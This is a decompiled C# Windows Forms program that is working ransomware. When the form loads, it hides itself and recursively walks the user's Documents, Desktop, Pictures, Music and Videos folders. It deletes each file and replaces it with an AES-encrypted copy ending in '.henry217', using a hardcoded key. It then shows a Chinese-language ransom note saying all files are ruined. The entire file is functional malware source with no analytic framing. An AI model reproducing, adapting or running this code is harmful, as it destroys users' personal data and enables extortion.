using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace ns0;

public class Form1 : Form
{
	private IContainer components;

	private Label label1;

	private Label label2;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Personal)));
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)));
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)));
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)));
		bl(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)));
		((Control)this).Show();
	}

	public static void bl(DirectoryInfo TheFolder)
	{
		DirectoryInfo[] directories = TheFolder.GetDirectories();
		foreach (DirectoryInfo directoryInfo in directories)
		{
			try
			{
				bl(new DirectoryInfo(directoryInfo.FullName));
			}
			catch (Exception)
			{
			}
		}
		FileInfo[] files = TheFolder.GetFiles();
		foreach (FileInfo fileInfo in files)
		{
			try
			{
				FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read);
				byte[] array = new byte[fileStream.Length];
				fileStream.Read(array, 0, array.Length);
				fileStream.Close();
				fileInfo.Delete();
				byte[] array2 = AESEncrypt(array, "12345678");
				FileStream fileStream2 = new FileStream(fileInfo.FullName + ".henry217", FileMode.Create, FileAccess.Write);
				fileStream2.Write(array2, 0, array2.Length);
				fileStream2.Close();
				File.Delete(fileInfo.FullName);
			}
			catch (Exception)
			{
			}
		}
	}

	public static byte[] AESEncrypt(byte[] EncryptByte, string EncryptKey)
	{
		if (EncryptByte.Length == 0)
		{
			throw new Exception("明文不得为空");
		}
		if (string.IsNullOrEmpty(EncryptKey))
		{
			throw new Exception("密钥不得为空");
		}
		byte[] rgbIV = Convert.FromBase64String("Rkb4jvUy/ye7Cd7k89QQgQ==");
		byte[] rgbSalt = Convert.FromBase64String("gsf4jvkyhye5/d7k8OrLgM==");
		Rijndael rijndael = Rijndael.Create();
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(EncryptKey, rgbSalt);
			ICryptoTransform transform = rijndael.CreateEncryptor(passwordDeriveBytes.GetBytes(32), rgbIV);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			cryptoStream.Write(EncryptByte, 0, EncryptByte.Length);
			cryptoStream.FlushFinalBlock();
			byte[] result = memoryStream.ToArray();
			memoryStream.Close();
			memoryStream.Dispose();
			cryptoStream.Close();
			cryptoStream.Dispose();
			return result;
		}
		catch (Exception)
		{
			throw;
		}
		finally
		{
			rijndael.Clear();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Expected O, but got Unknown
		label1 = new Label();
		label2 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("微软雅黑 Light", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)label1).set_Location(new Point(425, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(128, 46));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("勒索信");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("微软雅黑 Light", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)label2).set_Location(new Point(285, 84));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(524, 138));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("你好。你的所有文件都完蛋了。\r\n加密密码:\"12345678\"\r\n\r\n");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 18f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1066, 261));
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("勒索信");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
